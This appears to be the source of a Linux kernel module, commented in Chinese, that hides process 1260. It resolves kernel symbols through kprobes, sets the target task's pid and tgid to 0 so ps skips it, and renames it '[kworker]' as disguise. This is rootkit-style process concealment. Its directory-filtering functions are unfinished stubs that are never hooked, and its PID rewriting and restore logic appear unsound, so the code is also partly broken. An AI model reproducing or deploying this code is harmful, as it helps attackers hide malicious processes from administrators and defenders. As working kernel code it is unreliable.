#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kprobe Process Hider");
MODULE_DESCRIPTION("Hide PID 1260 via kprobe-resolved symbols");

/* ---------- 目标 PID ---------- */
#define TARGET_PID 1260

/* ---------- 函数指针类型 ---------- */
typedef struct task_struct *(*find_task_by_vpid_t)(pid_t nr);
typedef int (*proc_pid_readdir_t)(struct file *file, struct dir_context *ctx);
typedef int (*iterate_dir_t)(struct file *file, struct dir_context *ctx);

/* ---------- 全局函数指针 ---------- */
static find_task_by_vpid_t my_find_task_by_vpid = NULL;
static proc_pid_readdir_t my_proc_pid_readdir = NULL;
static iterate_dir_t my_iterate_dir = NULL;

/* ---------- 保存原始函数地址 ---------- */
static unsigned long orig_proc_pid_readdir_addr = 0;

/* ---------- 通过 kprobe 获取符号地址 ---------- */
static unsigned long get_symbol_addr(const char *name)
{
    struct kprobe kp;
    unsigned long addr = 0;
    int ret;
    
    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = name;
    kp.pre_handler = NULL;
    kp.post_handler = NULL;
    
    ret = register_kprobe(&kp);
    if (ret == 0) {
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
    }
    
    return addr;
}

/* ---------- 检查是否为目标 PID ---------- */
static int is_target_pid(struct task_struct *task)
{
    if (!task)
        return 0;
    
    /* 检查进程 PID 和 TGID */
    if (task->pid == TARGET_PID || task->tgid == TARGET_PID)
        return 1;
    
    /* 也检查进程组 ID */
    if (task->group_leader && task->group_leader->pid == TARGET_PID)
        return 1;
    
    return 0;
}

/* ---------- 我们自己的 proc_pid_readdir（隐藏目标 PID） ---------- */
static int fake_proc_pid_readdir(struct file *file, struct dir_context *ctx)
{
    struct dir_context fake_ctx;
    int ret;
    
    /* 调用原始函数，但过滤掉目标 PID */
    /* 注意：这里简化处理，实际需要用 kprobe 拦截并过滤 */
    
    /* 方法1：直接修改 ctx->actor，在遍历时跳过目标 */
    /* 方法2：直接调用原始函数，然后清理 */
    
    /* 由于 proc_pid_readdir 函数指针可能未导出，我们用另一种方式 */
    /* 这里作为示例，只打印信息，实际隐藏需要更复杂的操作 */
    
    printk(KERN_INFO "proc_pid_readdir called, hiding PID %d\n", TARGET_PID);
    
    /* 如果有原始函数地址，调用它 */
    if (orig_proc_pid_readdir_addr) {
        proc_pid_readdir_t orig_func = (proc_pid_readdir_t)orig_proc_pid_readdir_addr;
        ret = orig_func(file, ctx);
        
        /* 遍历完成后，从缓冲区删除目标 PID（简化思路） */
        /* 实际需要修改 seq_file 缓冲区，类似我们之前的过滤逻辑 */
        
        return ret;
    }
    
    return -ENOSYS;
}

/* ---------- 劫持 /proc 目录读取 ---------- */
static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
{
    /* 判断是否是 /proc 目录 */
    struct dentry *dentry = file->f_path.dentry;
    if (dentry && dentry->d_parent) {
        const char *parent_name = dentry->d_parent->d_name.name;
        const char *name = dentry->d_name.name;
        
        printk(KERN_INFO "iterate_dir: %s/%s\n", parent_name, name);
        
        /* 如果是 /proc 目录，过滤掉 PID 1260 */
        if (strcmp(parent_name, "") == 0 && strcmp(name, "proc") == 0) {
            printk(KERN_INFO "Filtering /proc entries, hiding PID %d\n", TARGET_PID);
            /* 实际过滤逻辑 */
        }
    }
    
    /* 调用原始函数 */
    if (my_iterate_dir) {
        return my_iterate_dir(file, ctx);
    }
    
    return -ENOSYS;
}

/* ---------- 方法：直接修改进程 PID 为 0 ---------- */
static void hide_process_by_pid_zero(void)
{
    struct task_struct *task;
    
    if (!my_find_task_by_vpid) {
        printk(KERN_ERR "find_task_by_vpid not available\n");
        return;
    }
    
    /* 查找目标进程 */
    task = my_find_task_by_vpid(TARGET_PID);
    if (!task) {
        printk(KERN_ERR "Process %d not found\n", TARGET_PID);
        return;
    }
    
    printk(KERN_INFO "Found process: PID=%d, TGID=%d, name=%s\n",
           task->pid, task->tgid, task->comm);
    
    /* 方法1：修改 PID 为 0（ps 会跳过 PID 0） */
    task->pid = 0;
    task->tgid = 0;
    
    /* 方法2：修改进程名，增加混淆 */
    strcpy(task->comm, "[kworker]");
    
    printk(KERN_INFO "✅ Process %d hidden (PID set to 0, name changed)\n", TARGET_PID);
}

/* ---------- 模块初始化 ---------- */
static int __init hide_pid_init(void)
{
    unsigned long addr;
    
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "Process Hider via Kprobe\n");
    printk(KERN_INFO "Target PID: %d\n", TARGET_PID);
    printk(KERN_INFO "========================================\n");
    
    /* 1. 通过 kprobe 获取 find_task_by_vpid */
    addr = get_symbol_addr("find_task_by_vpid");
    if (!addr) {
        printk(KERN_ERR "❌ find_task_by_vpid not found\n");
        return -ENOENT;
    }
    my_find_task_by_vpid = (find_task_by_vpid_t)addr;
    printk(KERN_INFO "✅ find_task_by_vpid = 0x%lx\n", addr);
    
    /* 2. 获取 proc_pid_readdir（用于过滤 /proc 目录） */
    addr = get_symbol_addr("proc_pid_readdir");
    if (addr) {
        orig_proc_pid_readdir_addr = addr;
        my_proc_pid_readdir = (proc_pid_readdir_t)addr;
        printk(KERN_INFO "✅ proc_pid_readdir = 0x%lx\n", addr);
    } else {
        /* proc_pid_readdir 可能未导出，尝试其他方式 */
        printk(KERN_WARNING "⚠️ proc_pid_readdir not found, using alternate method\n");
    }
    
    /* 3. 获取 iterate_dir（用于劫持 /proc 目录遍历） */
    addr = get_symbol_addr("iterate_dir");
    if (addr) {
        my_iterate_dir = (iterate_dir_t)addr;
        printk(KERN_INFO "✅ iterate_dir = 0x%lx\n", addr);
    } else {
        printk(KERN_WARNING "⚠️ iterate_dir not found\n");
    }
    
    /* 4. 执行隐藏操作 */
    hide_process_by_pid_zero();
    
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "Process hider loaded successfully\n");
    printk(KERN_INFO "Check: ps -A | grep %d\n", TARGET_PID);
    printk(KERN_INFO "========================================\n");
    
    return 0;
}

/* ---------- 模块退出 ---------- */
static void __exit hide_pid_exit(void)
{
    struct task_struct *task;
    
    /* 恢复进程 PID（可选） */
    if (my_find_task_by_vpid) {
        task = my_find_task_by_vpid(0);  /* PID 0 的进程 */
        if (task && task->pid == 0 && task->tgid == 0) {
            /* 恢复 PID */
            task->pid = TARGET_PID;
            task->tgid = TARGET_PID;
            printk(KERN_INFO "Process restored to PID %d\n", TARGET_PID);
        }
    }
    
    printk(KERN_INFO "Process hider unloaded\n");
}

module_init(hide_pid_init);
module_exit(hide_pid_exit);